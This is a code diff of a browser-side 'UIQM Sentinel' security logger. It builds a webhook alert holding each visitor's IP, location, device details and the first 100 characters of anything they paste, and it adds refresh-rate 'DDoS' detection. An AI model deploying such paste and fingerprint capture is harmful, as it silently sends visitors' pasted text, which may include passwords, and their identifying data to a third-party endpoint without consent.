@@ -9,22 +9,21 @@
 
         async getInfo() {
             try {
-                // Using ipwho.is which has proper CORS headers
-                const res = await fetch('https://ipwho.is/').catch(() => null);
+                const res = await fetch('https://freeipapi.com/api/json').catch(() => null);
                 const data = res ? await res.json() : {};
                 
                 return {
-                    ip: data.ip || 'Unknown',
-                    loc: data.city ? `${data.city}, ${data.region}, ${data.country}` : 'Unknown',
-                    isp: data.connection ? data.connection.isp : 'Unknown',
-                    tz: data.timezone ? data.timezone.id : 'Unknown',
+                    ip: data.ipAddress || 'Unknown',
+                    city: data.cityName || 'Unknown',
+                    state: data.regionName || 'Unknown',
+                    country: data.countryName || 'Unknown',
                     ua: navigator.userAgent,
                     plat: navigator.platform,
                     cpu: navigator.hardwareConcurrency || 'N/A',
                     mem: navigator.deviceMemory || 'N/A'
                 };
             } catch (e) {
-                return { ip: 'Error', loc: 'Error', ua: navigator.userAgent };
+                return { ip: 'Error', city: 'Error', state: 'Error', country: 'Error', ua: navigator.userAgent };
             }
         },
 
@@ -34,18 +33,21 @@
             this.last = now;
 
             const info = await this.getInfo();
+            const dateStr = new Date().toLocaleString();
             
             const payload = {
                 username: "uiqm sentinel",
                 embeds: [{
-                    title: 'Security Log: ' + type,
+                    title: 'Security Alert: ' + type,
                     color: 16711680,
                     fields: [
-                        { name: 'Details', value: msg },
-                        { name: 'Network', value: `IP: ||${info.ip}||\nLoc: ${info.loc}\nISP: ${info.isp}\nTZ: ${info.tz}` },
-                        { name: 'Device', value: `OS: ${info.plat}\nCPU: ${info.cpu} | RAM: ${info.mem}GB\nUA: \`${info.ua}\`` }
+                        { name: 'Attack Type', value: type },
+                        { name: 'Attack Details', value: msg },
+                        { name: 'Network Info', value: `IP: ||${info.ip}||\nCity: ${info.city}\nState: ${info.state}\nCountry: ${info.country}` },
+                        { name: 'Device Info', value: `OS: ${info.plat}\nCPU: ${info.cpu} Cores | RAM: ${info.mem}GB\nUser-Agent: \`${info.ua}\`` },
+                        { name: 'Time & Date', value: dateStr }
                     ],
-                    timestamp: new Date().toISOString()
+                    footer: { text: 'UIQM Sentinel System' }
                 }]
             };
 
@@ -57,7 +59,7 @@
         },
 
         init() {
-            // clock (Passive background task)
+            // clock
             const updateClock = () => {
                 const now = new Date();
                 const timeStr = now.toLocaleTimeString('en-US', { hour12: true, hour: 'numeric', minute: '2-digit', second: '2-digit' });
@@ -67,24 +69,10 @@
             updateClock();
             setInterval(updateClock, 1000);
 
-            // devtools check (resize only, no debugger)
-            let dev = false;
-            window.addEventListener('resize', () => {
-                const threshold = 160;
-                if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
-                    if (!dev) {
-                        this.log('DevTools', 'User resized window (possible devtools)');
-                        dev = true;
-                    }
-                } else {
-                    dev = false;
-                }
-            });
-
             // paste check
             window.addEventListener('paste', (e) => {
                 const data = e.clipboardData.getData('text');
-                this.log('Paste Detected', `User pasted: ${data.substring(0, 100)}...`);
+                this.log('Malicious Script Injection', `User pasted code: ${data.substring(0, 100)}...`);
             });
 
             // paths
@@ -92,17 +80,34 @@
             const p = window.location.pathname.toLowerCase();
             bad.forEach(f => {
                 if (p === f || p.startsWith(f + '/') || p.endsWith(f)) {
-                    this.log('Forbidden Path', `User probed: ${f}`);
+                    this.log('Subdomain / Directory Finder', `User probed hidden path: ${f}`);
                     window.location.href = 'https://google.com';
                 }
             });
 
             // shortcuts
             window.addEventListener('keydown', (e) => {
-                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
-                    this.log('Shortcut', `Key: ${e.key}`);
+                if ((e.ctrlKey && e.key === 'U')) {
+                    this.log('Source Code Probe', 'User attempted to View Source (Ctrl+U)');
                 }
             });
+
+            // Simple DDoS / Spam detection (Rapid Refresh)
+            const count = parseInt(sessionStorage.getItem('refresh_count') || '0');
+            const lastTime = parseInt(sessionStorage.getItem('last_refresh') || '0');
+            const now = Date.now();
+            
+            if (now - lastTime < 2000) {
+                const newCount = count + 1;
+                sessionStorage.setItem('refresh_count', newCount);
+                if (newCount > 5) {
+                    this.log('Possible DDoS / Bot Attack', `User is refreshing rapidly (${newCount} times in short succession)`);
+                    sessionStorage.setItem('refresh_count', '0');
+                }
+            } else {
+                sessionStorage.setItem('refresh_count', '0');
+            }
+            sessionStorage.setItem('last_refresh', now);
         }
     };
 
